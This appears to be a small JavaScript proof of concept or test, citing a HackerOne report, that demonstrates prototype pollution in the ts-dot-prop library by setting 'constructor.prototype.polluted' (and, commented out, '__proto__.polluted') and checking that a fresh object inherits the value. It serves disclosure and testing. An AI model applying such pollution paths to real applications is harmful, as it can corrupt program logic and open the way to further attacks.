// //https://hackerone.com/reports/980599
// test("prototype pollution in ts-dot-prop", () => {
  const tsDot = require("ts-dot-prop");

  let obj = {};
console.log({}.polluted);
tsDot.set(obj, "constructor.prototype.polluted", "yes");
  //tsDot.set(obj, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
